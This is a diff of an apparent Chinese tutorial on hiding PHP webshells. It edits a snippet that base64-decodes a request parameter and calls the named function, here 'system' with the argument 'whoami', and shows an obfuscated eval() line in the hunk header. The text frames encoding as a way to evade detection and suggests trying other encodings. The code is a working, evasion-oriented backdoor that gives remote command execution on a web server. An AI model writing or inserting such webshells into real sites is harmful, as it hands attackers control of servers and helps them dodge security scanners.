@@ -1208,18 +1208,14 @@ eval($O00O0O("JE8wTzAwMD0iU0VCb1d4VGJ2SGhRTnFqeW5JUk1jbWxBS1lrWnVmVkpVQ2llYUxkc3
 
 ```php
 $decrpt = $_REQUEST['a'];
-$decrps = $_REQUEST['b'];
-$arrs = explode("|", $decrpt)[1];
-$arrs = explode("|", base64_decode($arrs));
-$arrt = explode("|", $decrps)[1];
-$arrt = explode("|", base64_decode($arrt)); call_user_func($arrs[0],$arrt[0]);
+$arrs = explode("|", base64_decode($decrpt));
+call_user_func($arrs[0],$arrs[1]);
 ```
 
 传参内容：
 
 ```php
-a=c3lzdGVt    //system的base64加密
-b=d2hvYW1p    //whoami的base64加密
+a=c3lzdGVtfHdob2FtaSAg    //system|whoami  的base64加密
 ```
 
 也可以尝试使用其他编码或者加密方式进行传参
